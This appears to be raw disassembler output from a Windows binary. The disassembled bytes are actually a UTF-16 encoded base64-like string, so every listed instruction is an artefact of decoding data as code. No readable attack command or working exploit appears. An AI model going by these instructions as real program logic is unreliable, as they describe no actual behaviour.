  409c4c:	62 00                	bound  %eax,(%eax)
  409c4e:	6d                   	insl   (%dx),%es:(%edi)
  409c4f:	00 72 00             	add    %dh,0x0(%edx)
  409c52:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  409c56:	6c                   	insb   (%dx),%es:(%edi)
  409c57:	00 45 00             	add    %al,0x0(%ebp)
  409c5a:	78 00                	js     0x409c5c
  409c5c:	78 00                	js     0x409c5e
  409c5e:	6c                   	insb   (%dx),%es:(%edi)
  409c5f:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  409c63:	00 78 00             	add    %bh,0x0(%eax)
  409c66:	49                   	dec    %ecx
  409c67:	00 72 00             	add    %dh,0x0(%edx)
  409c6a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6b:	00 41 00             	add    %al,0x0(%ecx)
  409c6e:	31 00                	xor    %eax,(%eax)
  409c70:	68 00 4f 00 6a       	push   $0x6a004f00
  409c75:	00 4e 00             	add    %cl,0x0(%esi)
  409c78:	50                   	push   %eax
  409c79:	00 38                	add    %bh,(%eax)
  409c7b:	00 7a 00             	add    %bh,0x0(%edx)
  409c7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7f:	00 7a 00             	add    %bh,0x0(%edx)
  409c82:	76 00                	jbe    0x409c84
  409c84:	70 00                	jo     0x409c86
  409c86:	77 00                	ja     0x409c88
  409c88:	70 00                	jo     0x409c8a
  409c8a:	56                   	push   %esi
  409c8b:	00 30                	add    %dh,(%eax)
  409c8d:	00 33                	add    %dh,(%ebx)
  409c8f:	00 57 00             	add    %dl,0x0(%edi)
  409c92:	2f                   	das
  409c93:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c96:	6f                   	outsl  %ds:(%esi),(%dx)
  409c97:	00 6e 00             	add    %ch,0x0(%esi)
  409c9a:	7a 00                	jp     0x409c9c
  409c9c:	69 00 6b 00 68 00    	imul   $0x68006b,(%eax),%eax
  409ca2:	67 00 36 00 45       	add    %dh,0x4500
  409ca7:	00 5a 00             	add    %bl,0x0(%edx)
  409caa:	38 00                	cmp    %al,(%eax)
  409cac:	43                   	inc    %ebx
  409cad:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  409cb1:	00 66 00             	add    %ah,0x0(%esi)
  409cb4:	4d                   	dec    %ebp
  409cb5:	00 55 00             	add    %dl,0x0(%ebp)
  409cb8:	77 00                	ja     0x409cba
  409cba:	47                   	inc    %edi
  409cbb:	00 6e 00             	add    %ch,0x0(%esi)
  409cbe:	4e                   	dec    %esi
  409cbf:	00 67 00             	add    %ah,0x0(%edi)
  409cc2:	57                   	push   %edi
  409cc3:	00 4d 00             	add    %cl,0x0(%ebp)
  409cc6:	34 00                	xor    $0x0,%al
  409cc8:	79 00                	jns    0x409cca
  409cca:	2b 00                	sub    (%eax),%eax
  409ccc:	7a 00                	jp     0x409cce
  409cce:	44                   	inc    %esp
  409ccf:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  409cd3:	00 6f 00             	add    %ch,0x0(%edi)
  409cd6:	30 00                	xor    %al,(%eax)
  409cd8:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  409cdc:	68 00 31 00 31       	push   $0x31003100
  409ce1:	00 59 00             	add    %bl,0x0(%ecx)
  409ce4:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409ce8:	61                   	popa
  409ce9:	00 42 00             	add    %al,0x0(%edx)
  409cec:	79 00                	jns    0x409cee
  409cee:	54                   	push   %esp
  409cef:	00 6d 00             	add    %ch,0x0(%ebp)
  409cf2:	54                   	push   %esp
  409cf3:	00 76 00             	add    %dh,0x0(%esi)
  409cf6:	46                   	inc    %esi
  409cf7:	00 33                	add    %dh,(%ebx)
  409cf9:	00 66 00             	add    %ah,0x0(%esi)
  409cfc:	45                   	inc    %ebp
  409cfd:	00 36                	add    %dh,(%esi)
  409cff:	00 2b                	add    %ch,(%ebx)
  409d01:	00 68 00             	add    %ch,0x0(%eax)
  409d04:	6d                   	insl   (%dx),%es:(%edi)
  409d05:	00 57 00             	add    %dl,0x0(%edi)
  409d08:	57                   	push   %edi
  409d09:	00 50 00             	add    %dl,0x0(%eax)
  409d0c:	4b                   	dec    %ebx
  409d0d:	00 62 00             	add    %ah,0x0(%edx)
  409d10:	79 00                	jns    0x409d12
  409d12:	4e                   	dec    %esi
  409d13:	00 6b 00             	add    %ch,0x0(%ebx)
  409d16:	4e                   	dec    %esi
  409d17:	00 6d 00             	add    %ch,0x0(%ebp)
  409d1a:	31 00                	xor    %eax,(%eax)
  409d1c:	49                   	dec    %ecx
  409d1d:	00 57 00             	add    %dl,0x0(%edi)
  409d20:	47                   	inc    %edi
  409d21:	00 49 00             	add    %cl,0x0(%ecx)
  409d24:	47                   	inc    %edi
  409d25:	00 75 00             	add    %dh,0x0(%ebp)
  409d28:	51                   	push   %ecx
  409d29:	00 37                	add    %dh,(%edi)
  409d2b:	00 2b                	add    %ch,(%ebx)
  409d2d:	00 43 00             	add    %al,0x0(%ebx)
  409d30:	2b 00                	sub    (%eax),%eax
  409d32:	59                   	pop    %ecx
  409d33:	00 75 00             	add    %dh,0x0(%ebp)
  409d36:	31 00                	xor    %eax,(%eax)
  409d38:	77 00                	ja     0x409d3a
  409d3a:	4a                   	dec    %edx
  409d3b:	00 63 00             	add    %ah,0x0(%ebx)
  409d3e:	46                   	inc    %esi
  409d3f:	00 72 00             	add    %dh,0x0(%edx)
  409d42:	77 00                	ja     0x409d44
  409d44:	62 00                	bound  %eax,(%eax)
  409d46:	6f                   	outsl  %ds:(%esi),(%dx)
  409d47:	00 72 00             	add    %dh,0x0(%edx)
  409d4a:	56                   	push   %esi
  409d4b:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  409d4f:	00 46 00             	add    %al,0x0(%esi)
  409d52:	58                   	pop    %eax
  409d53:	00 72 00             	add    %dh,0x0(%edx)
  409d56:	34 00                	xor    $0x0,%al
  409d58:	69 00 64 00 42 00    	imul   $0x420064,(%eax),%eax
  409d5e:	2b 00                	sub    (%eax),%eax
  409d60:	47                   	inc    %edi
  409d61:	00 38                	add    %bh,(%eax)
  409d63:	00 75 00             	add    %dh,0x0(%ebp)
  409d66:	59                   	pop    %ecx
  409d67:	00 33                	add    %dh,(%ebx)
  409d69:	00 62 00             	add    %ah,0x0(%edx)
  409d6c:	6c                   	insb   (%dx),%es:(%edi)
  409d6d:	00 33                	add    %dh,(%ebx)
  409d6f:	00 49 00             	add    %cl,0x0(%ecx)
  409d72:	4f                   	dec    %edi
  409d73:	00 63 00             	add    %ah,0x0(%ebx)
  409d76:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  409d7a:	31 00                	xor    %eax,(%eax)
  409d7c:	51                   	push   %ecx
  409d7d:	00 47 00             	add    %al,0x0(%edi)
  409d80:	49                   	dec    %ecx
  409d81:	00 52 00             	add    %dl,0x0(%edx)
  409d84:	47                   	inc    %edi
  409d85:	00 4d 00             	add    %cl,0x0(%ebp)
  409d88:	71 00                	jno    0x409d8a
  409d8a:	6d                   	insl   (%dx),%es:(%edi)
  409d8b:	00 50 00             	add    %dl,0x0(%eax)
  409d8e:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  409d92:	42                   	inc    %edx
  409d93:	00 63 00             	add    %ah,0x0(%ebx)
  409d96:	70 00                	jo     0x409d98
  409d98:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  409d9c:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  409da0:	35 00 51 00 63       	xor    $0x63005100,%eax
  409da5:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  409da9:	00 59 00             	add    %bl,0x0(%ecx)
  409dac:	70 00                	jo     0x409dae
  409dae:	4b                   	dec    %ebx
  409daf:	00 6b 00             	add    %ch,0x0(%ebx)
  409db2:	51                   	push   %ecx
  409db3:	00 42 00             	add    %al,0x0(%edx)
  409db6:	35 00 2b 00 61       	xor    $0x61002b00,%eax
  409dbb:	00 6b 00             	add    %ch,0x0(%ebx)
  409dbe:	54                   	push   %esp
  409dbf:	00 30                	add    %dh,(%eax)
  409dc1:	00 67 00             	add    %ah,0x0(%edi)
  409dc4:	38 00                	cmp    %al,(%eax)
  409dc6:	2f                   	das
  409dc7:	00 55 00             	add    %dl,0x0(%ebp)
  409dca:	46                   	inc    %esi
  409dcb:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  409dcf:	00 32                	add    %dh,(%edx)
  409dd1:	00 76 00             	add    %dh,0x0(%esi)
  409dd4:	32 00                	xor    (%eax),%al
  409dd6:	53                   	push   %ebx
  409dd7:	00 46 00             	add    %al,0x0(%esi)
  409dda:	4f                   	dec    %edi
  409ddb:	00 46 00             	add    %al,0x0(%esi)
  409dde:	39 00                	cmp    %eax,(%eax)
  409de0:	31 00                	xor    %eax,(%eax)
  409de2:	74 00                	je     0x409de4
  409de4:	6a 00                	push   $0x0
  409de6:	68 00 44 00 2f       	push   $0x2f004400
  409deb:	00 39                	add    %bh,(%ecx)
  409ded:	00 43 00             	add    %al,0x0(%ebx)
  409df0:	49                   	dec    %ecx
  409df1:	00 67 00             	add    %ah,0x0(%edi)
  409df4:	75 00                	jne    0x409df6
  409df6:	5a                   	pop    %edx
  409df7:	00 56 00             	add    %dl,0x0(%esi)
  409dfa:	63 00                	arpl   %eax,(%eax)
  409dfc:	45                   	inc    %ebp
  409dfd:	00 71 00             	add    %dh,0x0(%ecx)
  409e00:	62 00                	bound  %eax,(%eax)
  409e02:	31 00                	xor    %eax,(%eax)
  409e04:	6c                   	insb   (%dx),%es:(%edi)
  409e05:	00 73 00             	add    %dh,0x0(%ebx)
  409e08:	72 00                	jb     0x409e0a
  409e0a:	39 00                	cmp    %eax,(%eax)
  409e0c:	59                   	pop    %ecx
  409e0d:	00 55 00             	add    %dl,0x0(%ebp)
  409e10:	4f                   	dec    %edi
  409e11:	00 42 00             	add    %al,0x0(%edx)
  409e14:	6d                   	insl   (%dx),%es:(%edi)
  409e15:	00 71 00             	add    %dh,0x0(%ecx)
  409e18:	39 00                	cmp    %eax,(%eax)
  409e1a:	69 00 43 00 4b 00    	imul   $0x4b0043,(%eax),%eax
  409e20:	55                   	push   %ebp
  409e21:	00 5a 00             	add    %bl,0x0(%edx)
  409e24:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  409e28:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  409e2c:	32 00                	xor    (%eax),%al
  409e2e:	63 00                	arpl   %eax,(%eax)
  409e30:	75 00                	jne    0x409e32
  409e32:	6b 00 58             	imul   $0x58,(%eax),%eax
  409e35:	00 4a 00             	add    %cl,0x0(%edx)
  409e38:	43                   	inc    %ebx
  409e39:	00 78 00             	add    %bh,0x0(%eax)
  409e3c:	47                   	inc    %edi
  409e3d:	00 6a 00             	add    %ch,0x0(%edx)
  409e40:	4d                   	dec    %ebp
  409e41:	00 67 00             	add    %ah,0x0(%edi)
  409e44:	4c                   	dec    %esp
  409e45:	00 5a 00             	add    %bl,0x0(%edx)
  409e48:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409e4c:	71 00                	jno    0x409e4e
  409e4e:	4b                   	dec    %ebx
  409e4f:	00 4a 00             	add    %cl,0x0(%edx)
  409e52:	57                   	push   %edi
  409e53:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  409e57:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  409e5b:	00 4e 00             	add    %cl,0x0(%esi)
  409e5e:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  409e62:	48                   	dec    %eax
  409e63:	00 67 00             	add    %ah,0x0(%edi)
  409e66:	41                   	inc    %ecx
  409e67:	00 78 00             	add    %bh,0x0(%eax)
  409e6a:	68 00 71 00 74       	push   $0x74007100
  409e6f:	00 2b                	add    %ch,(%ebx)
  409e71:	00 37                	add    %dh,(%edi)
  409e73:	00 43 00             	add    %al,0x0(%ebx)
  409e76:	45                   	inc    %ebp
  409e77:	00 37                	add    %dh,(%edi)
  409e79:	00 70 00             	add    %dh,0x0(%eax)
  409e7c:	5a                   	pop    %edx
  409e7d:	00 63 00             	add    %ah,0x0(%ebx)
  409e80:	2b 00                	sub    (%eax),%eax
  409e82:	4f                   	dec    %edi
  409e83:	00 76 00             	add    %dh,0x0(%esi)
  409e86:	67 00 55 00          	add    %dl,0x0(%di)
  409e8a:	45                   	inc    %ebp
  409e8b:	00 38                	add    %bh,(%eax)
  409e8d:	00 72 00             	add    %dh,0x0(%edx)
  409e90:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  409e94:	56                   	push   %esi
  409e95:	00 31                	add    %dh,(%ecx)
  409e97:	00 4b 00             	add    %cl,0x0(%ebx)
  409e9a:	7a 00                	jp     0x409e9c
  409e9c:	57                   	push   %edi
  409e9d:	00 38                	add    %bh,(%eax)
  409e9f:	00 38                	add    %bh,(%eax)
  409ea1:	00 37                	add    %dh,(%edi)
  409ea3:	00 6a 00             	add    %ch,0x0(%edx)
  409ea6:	4d                   	dec    %ebp
  409ea7:	00 73 00             	add    %dh,0x0(%ebx)
  409eaa:	69 00 37 00 6f 00    	imul   $0x6f0037,(%eax),%eax
  409eb0:	37                   	aaa
  409eb1:	00 52 00             	add    %dl,0x0(%edx)
  409eb4:	4a                   	dec    %edx
  409eb5:	00 77 00             	add    %dh,0x0(%edi)
  409eb8:	45                   	inc    %ebp
  409eb9:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ebc:	4d                   	dec    %ebp
  409ebd:	00 46 00             	add    %al,0x0(%esi)
  409ec0:	45                   	inc    %ebp
  409ec1:	00 61 00             	add    %ah,0x0(%ecx)
  409ec4:	56                   	push   %esi
  409ec5:	00 6b 00             	add    %ch,0x0(%ebx)
  409ec8:	61                   	popa
  409ec9:	00 76 00             	add    %dh,0x0(%esi)
  409ecc:	46                   	inc    %esi
  409ecd:	00 4f 00             	add    %cl,0x0(%edi)
  409ed0:	79 00                	jns    0x409ed2
  409ed2:	44                   	inc    %esp
  409ed3:	00 73 00             	add    %dh,0x0(%ebx)
  409ed6:	54                   	push   %esp
  409ed7:	00 70 00             	add    %dh,0x0(%eax)
  409eda:	43                   	inc    %ebx
  409edb:	00 6b 00             	add    %ch,0x0(%ebx)
  409ede:	55                   	push   %ebp
  409edf:	00 32                	add    %dh,(%edx)
  409ee1:	00 6b 00             	add    %ch,0x0(%ebx)
  409ee4:	4e                   	dec    %esi
  409ee5:	00 2b                	add    %ch,(%ebx)
  409ee7:	00 45 00             	add    %al,0x0(%ebp)
  409eea:	32 00                	xor    (%eax),%al
  409eec:	39 00                	cmp    %eax,(%eax)
  409eee:	4e                   	dec    %esi
  409eef:	00 58 00             	add    %bl,0x0(%eax)
  409ef2:	39 00                	cmp    %eax,(%eax)
  409ef4:	69 00 44 00 4c 00    	imul   $0x4c0044,(%eax),%eax
  409efa:	32 00                	xor    (%eax),%al
  409efc:	7a 00                	jp     0x409efe
  409efe:	4c                   	dec    %esp
  409eff:	00 72 00             	add    %dh,0x0(%edx)
  409f02:	42                   	inc    %edx
  409f03:	00 35 00 46 00 6f    	add    %dh,0x6f004600
  409f09:	00 65 00             	add    %ah,0x0(%ebp)
  409f0c:	63 00                	arpl   %eax,(%eax)
  409f0e:	32 00                	xor    (%eax),%al
  409f10:	4b                   	dec    %ebx
  409f11:	00 31                	add    %dh,(%ecx)
  409f13:	00 5a 00             	add    %bl,0x0(%edx)
  409f16:	61                   	popa
  409f17:	00 4a 00             	add    %cl,0x0(%edx)
  409f1a:	63 00                	arpl   %eax,(%eax)
  409f1c:	4f                   	dec    %edi
  409f1d:	00 73 00             	add    %dh,0x0(%ebx)
  409f20:	6c                   	insb   (%dx),%es:(%edi)
  409f21:	00 76 00             	add    %dh,0x0(%esi)
  409f24:	6f                   	outsl  %ds:(%esi),(%dx)
  409f25:	00 6d 00             	add    %ch,0x0(%ebp)
  409f28:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  409f2c:	50                   	push   %eax
  409f2d:	00 4b 00             	add    %cl,0x0(%ebx)
  409f30:	5a                   	pop    %edx
  409f31:	00 56 00             	add    %dl,0x0(%esi)
  409f34:	55                   	push   %ebp
  409f35:	00 49 00             	add    %cl,0x0(%ecx)
  409f38:	48                   	dec    %eax
  409f39:	00 55 00             	add    %dl,0x0(%ebp)
  409f3c:	46                   	inc    %esi
  409f3d:	00 33                	add    %dh,(%ebx)
  409f3f:	00 51 00             	add    %dl,0x0(%ecx)
  409f42:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  409f46:	79 00                	jns    0x409f48
  409f48:	56                   	push   %esi
  409f49:	00 53 00             	add    %dl,0x0(%ebx)
  409f4c:	45                   	inc    %ebp
  409f4d:	00 58 00             	add    %bl,0x0(%eax)
  409f50:	58                   	pop    %eax
  409f51:	00 79 00             	add    %bh,0x0(%ecx)
  409f54:	43                   	inc    %ebx
  409f55:	00 58 00             	add    %bl,0x0(%eax)
  409f58:	50                   	push   %eax
  409f59:	00 79 00             	add    %bh,0x0(%ecx)
  409f5c:	44                   	inc    %esp
  409f5d:	00 56 00             	add    %dl,0x0(%esi)
  409f60:	51                   	push   %ecx
  409f61:	00 75 00             	add    %dh,0x0(%ebp)
  409f64:	52                   	push   %edx
  409f65:	00 6f 00             	add    %ch,0x0(%edi)
  409f68:	6c                   	insb   (%dx),%es:(%edi)
  409f69:	00 66 00             	add    %ah,0x0(%esi)
  409f6c:	4c                   	dec    %esp
  409f6d:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  409f71:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  409f75:	00 53 00             	add    %dl,0x0(%ebx)
  409f78:	2f                   	das
  409f79:	00 42 00             	add    %al,0x0(%edx)
  409f7c:	47                   	inc    %edi
  409f7d:	00 6f 00             	add    %ch,0x0(%edi)
  409f80:	73 00                	jae    0x409f82
  409f82:	61                   	popa
  409f83:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f86:	76 00                	jbe    0x409f88
  409f88:	39 00                	cmp    %eax,(%eax)
  409f8a:	69 00 38 00 4e 00    	imul   $0x4e0038,(%eax),%eax
  409f90:	4e                   	dec    %esi
  409f91:	00 4e 00             	add    %cl,0x0(%esi)
  409f94:	43                   	inc    %ebx
  409f95:	00 31                	add    %dh,(%ecx)
  409f97:	00 78 00             	add    %bh,0x0(%eax)
  409f9a:	32 00                	xor    (%eax),%al
  409f9c:	53                   	push   %ebx
  409f9d:	00 2f                	add    %ch,(%edi)
  409f9f:	00 73 00             	add    %dh,0x0(%ebx)
  409fa2:	63 00                	arpl   %eax,(%eax)
  409fa4:	56                   	push   %esi
  409fa5:	00 33                	add    %dh,(%ebx)
  409fa7:	00 70 00             	add    %dh,0x0(%eax)
  409faa:	48                   	dec    %eax
  409fab:	00 4f 00             	add    %cl,0x0(%edi)
  409fae:	31 00                	xor    %eax,(%eax)
  409fb0:	70 00                	jo     0x409fb2
  409fb2:	6d                   	insl   (%dx),%es:(%edi)
  409fb3:	00 36                	add    %dh,(%esi)
  409fb5:	00 69 00             	add    %ch,0x0(%ecx)
  409fb8:	6a 00                	push   $0x0
  409fba:	4d                   	dec    %ebp
  409fbb:	00 48 00             	add    %cl,0x0(%eax)
  409fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  409fbf:	00 38                	add    %bh,(%eax)
  409fc1:	00 62 00             	add    %ah,0x0(%edx)
  409fc4:	31 00                	xor    %eax,(%eax)
  409fc6:	4c                   	dec    %esp
  409fc7:	00 59 00             	add    %bl,0x0(%ecx)
  409fca:	32 00                	xor    (%eax),%al
  409fcc:	75 00                	jne    0x409fce
  409fce:	67 00 33             	add    %dh,(%bp,%di)
  409fd1:	00 6e 00             	add    %ch,0x0(%esi)
  409fd4:	66 00 42 00          	data16 add %al,0x0(%edx)
  409fd8:	31 00                	xor    %eax,(%eax)
  409fda:	43                   	inc    %ebx
  409fdb:	00 6b 00             	add    %ch,0x0(%ebx)
  409fde:	6c                   	insb   (%dx),%es:(%edi)
  409fdf:	00 56 00             	add    %dl,0x0(%esi)
  409fe2:	59                   	pop    %ecx
  409fe3:	00 32                	add    %dh,(%edx)
  409fe5:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fe8:	53                   	push   %ebx
  409fe9:	00 52 00             	add    %dl,0x0(%edx)
  409fec:	79 00                	jns    0x409fee
  409fee:	76 00                	jbe    0x409ff0
  409ff0:	33 00                	xor    (%eax),%eax
  409ff2:	56                   	push   %esi
  409ff3:	00 38                	add    %bh,(%eax)
  409ff5:	00 35 00 67 00 42    	add    %dh,0x42006700
  409ffb:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  409fff:	00 4d 00             	add    %cl,0x0(%ebp)
  40a002:	31 00                	xor    %eax,(%eax)
  40a004:	75 00                	jne    0x40a006
  40a006:	5a                   	pop    %edx
  40a007:	00 51 00             	add    %dl,0x0(%ecx)
  40a00a:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a00e:	49                   	dec    %ecx
  40a00f:	00 61 00             	add    %ah,0x0(%ecx)
  40a012:	46                   	inc    %esi
  40a013:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a017:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40a01b:	00 76 00             	add    %dh,0x0(%esi)
  40a01e:	33 00                	xor    (%eax),%eax
  40a020:	62 00                	bound  %eax,(%eax)
  40a022:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40a026:	6e                   	outsb  %ds:(%esi),(%dx)
  40a027:	00 6d 00             	add    %ch,0x0(%ebp)
  40a02a:	34 00                	xor    $0x0,%al
  40a02c:	54                   	push   %esp
  40a02d:	00 69 00             	add    %ch,0x0(%ecx)
  40a030:	4a                   	dec    %edx
  40a031:	00 42 00             	add    %al,0x0(%edx)
  40a034:	48                   	dec    %eax
  40a035:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a039:	00 71 00             	add    %dh,0x0(%ecx)
  40a03c:	75 00                	jne    0x40a03e
  40a03e:	76 00                	jbe    0x40a040
  40a040:	78 00                	js     0x40a042
  40a042:	34 00                	xor    $0x0,%al
  40a044:	72 00                	jb     0x40a046
  40a046:	53                   	push   %ebx
  40a047:	00 41 00             	add    %al,0x0(%ecx)
  40a04a:	45                   	inc    %ebp
  40a04b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a04e:	34 00                	xor    $0x0,%al
  40a050:	79 00                	jns    0x40a052
  40a052:	6a 00                	push   $0x0
  40a054:	45                   	inc    %ebp
  40a055:	00 47 00             	add    %al,0x0(%edi)
  40a058:	78 00                	js     0x40a05a
  40a05a:	6a 00                	push   $0x0
  40a05c:	68 00 76 00 4d       	push   $0x4d007600
  40a061:	00 77 00             	add    %dh,0x0(%edi)
  40a064:	41                   	inc    %ecx
  40a065:	00 30                	add    %dh,(%eax)
  40a067:	00 33                	add    %dh,(%ebx)
  40a069:	00 46 00             	add    %al,0x0(%esi)
  40a06c:	56                   	push   %esi
  40a06d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a070:	42                   	inc    %edx
  40a071:	00 51 00             	add    %dl,0x0(%ecx)
  40a074:	50                   	push   %eax
  40a075:	00 68 00             	add    %ch,0x0(%eax)
  40a078:	74 00                	je     0x40a07a
  40a07a:	64 00 44 00 47       	add    %al,%fs:0x47(%eax,%eax,1)
  40a07f:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40a083:	00 76 00             	add    %dh,0x0(%esi)
  40a086:	55                   	push   %ebp
  40a087:	00 4d 00             	add    %cl,0x0(%ebp)
  40a08a:	70 00                	jo     0x40a08c
  40a08c:	4c                   	dec    %esp
  40a08d:	00 61 00             	add    %ah,0x0(%ecx)
  40a090:	4d                   	dec    %ebp
  40a091:	00 47 00             	add    %al,0x0(%edi)
  40a094:	72 00                	jb     0x40a096
  40a096:	57                   	push   %edi
  40a097:	00 41 00             	add    %al,0x0(%ecx)
  40a09a:	5a                   	pop    %edx
  40a09b:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40a09f:	00 65 00             	add    %ah,0x0(%ebp)
  40a0a2:	55                   	push   %ebp
  40a0a3:	00 37                	add    %dh,(%edi)
  40a0a5:	00 36                	add    %dh,(%esi)
  40a0a7:	00 38                	add    %bh,(%eax)
  40a0a9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0ac:	52                   	push   %edx
  40a0ad:	00 4e 00             	add    %cl,0x0(%esi)
  40a0b0:	34 00                	xor    $0x0,%al
  40a0b2:	57                   	push   %edi
  40a0b3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0b6:	42                   	inc    %edx
  40a0b7:	00 62 00             	add    %ah,0x0(%edx)
  40a0ba:	38 00                	cmp    %al,(%eax)
  40a0bc:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40a0c0:	55                   	push   %ebp
  40a0c1:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40a0c5:	00 79 00             	add    %bh,0x0(%ecx)
  40a0c8:	71 00                	jno    0x40a0ca
  40a0ca:	49                   	dec    %ecx
  40a0cb:	00 5a 00             	add    %bl,0x0(%edx)
  40a0ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0cf:	00 36                	add    %dh,(%esi)
  40a0d1:	00 53 00             	add    %dl,0x0(%ebx)
  40a0d4:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a0d7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0da:	77 00                	ja     0x40a0dc
  40a0dc:	4f                   	dec    %edi
  40a0dd:	00 78 00             	add    %bh,0x0(%eax)
  40a0e0:	42                   	inc    %edx
  40a0e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a0e4:	52                   	push   %edx
  40a0e5:	00 66 00             	add    %ah,0x0(%esi)
  40a0e8:	53                   	push   %ebx
  40a0e9:	00 72 00             	add    %dh,0x0(%edx)
  40a0ec:	52                   	push   %edx
  40a0ed:	00 33                	add    %dh,(%ebx)
  40a0ef:	00 70 00             	add    %dh,0x0(%eax)
  40a0f2:	49                   	dec    %ecx
  40a0f3:	00 69 00             	add    %ch,0x0(%ecx)
  40a0f6:	50                   	push   %eax
  40a0f7:	00 36                	add    %dh,(%esi)
  40a0f9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0fc:	6c                   	insb   (%dx),%es:(%edi)
  40a0fd:	00 49 00             	add    %cl,0x0(%ecx)
  40a100:	78 00                	js     0x40a102
  40a102:	50                   	push   %eax
  40a103:	00 69 00             	add    %ch,0x0(%ecx)
  40a106:	46                   	inc    %esi
  40a107:	00 63 00             	add    %ah,0x0(%ebx)
  40a10a:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40a10e:	47                   	inc    %edi
  40a10f:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40a113:	00 59 00             	add    %bl,0x0(%ecx)
  40a116:	70 00                	jo     0x40a118
  40a118:	63 00                	arpl   %eax,(%eax)
  40a11a:	67 00 36 00 2b       	add    %dh,0x2b00
  40a11f:	00 69 00             	add    %ch,0x0(%ecx)
  40a122:	6e                   	outsb  %ds:(%esi),(%dx)
  40a123:	00 38                	add    %bh,(%eax)
  40a125:	00 56 00             	add    %dl,0x0(%esi)
  40a128:	43                   	inc    %ebx
  40a129:	00 79 00             	add    %bh,0x0(%ecx)
  40a12c:	69 00 4e 00 65 00    	imul   $0x65004e,(%eax),%eax
  40a132:	34 00                	xor    $0x0,%al
  40a134:	50                   	push   %eax
  40a135:	00 63 00             	add    %ah,0x0(%ebx)
  40a138:	79 00                	jns    0x40a13a
  40a13a:	42                   	inc    %edx
  40a13b:	00 32                	add    %dh,(%edx)
  40a13d:	00 79 00             	add    %bh,0x0(%ecx)
  40a140:	70 00                	jo     0x40a142
  40a142:	38 00                	cmp    %al,(%eax)
  40a144:	36 00 36             	add    %dh,%ss:(%esi)
  40a147:	00 32                	add    %dh,(%edx)
  40a149:	00 41 00             	add    %al,0x0(%ecx)
  40a14c:	7a 00                	jp     0x40a14e
  40a14e:	34 00                	xor    $0x0,%al
  40a150:	6f                   	outsl  %ds:(%esi),(%dx)
  40a151:	00 75 00             	add    %dh,0x0(%ebp)
  40a154:	62 00                	bound  %eax,(%eax)
  40a156:	6b 00 67             	imul   $0x67,(%eax),%eax
  40a159:	00 35 00 34 00 74    	add    %dh,0x74003400
  40a15f:	00 55 00             	add    %dl,0x0(%ebp)
  40a162:	38 00                	cmp    %al,(%eax)
  40a164:	32 00                	xor    (%eax),%al
  40a166:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40a16a:	31 00                	xor    %eax,(%eax)
  40a16c:	4c                   	dec    %esp
  40a16d:	00 4e 00             	add    %cl,0x0(%esi)
  40a170:	55                   	push   %ebp
  40a171:	00 6f 00             	add    %ch,0x0(%edi)
  40a174:	55                   	push   %ebp
  40a175:	00 39                	add    %bh,(%ecx)
  40a177:	00 77 00             	add    %dh,0x0(%edi)
  40a17a:	59                   	pop    %ecx
  40a17b:	00 70 00             	add    %dh,0x0(%eax)
  40a17e:	31 00                	xor    %eax,(%eax)
  40a180:	2b 00                	sub    (%eax),%eax
  40a182:	39 00                	cmp    %eax,(%eax)
  40a184:	61                   	popa
  40a185:	00 36                	add    %dh,(%esi)
  40a187:	00 5a 00             	add    %bl,0x0(%edx)
  40a18a:	77 00                	ja     0x40a18c
  40a18c:	4e                   	dec    %esi
  40a18d:	00 55 00             	add    %dl,0x0(%ebp)
  40a190:	72 00                	jb     0x40a192
  40a192:	48                   	dec    %eax
  40a193:	00 56 00             	add    %dl,0x0(%esi)
  40a196:	6f                   	outsl  %ds:(%esi),(%dx)
  40a197:	00 61 00             	add    %ah,0x0(%ecx)
  40a19a:	6b 00 65             	imul   $0x65,(%eax),%eax
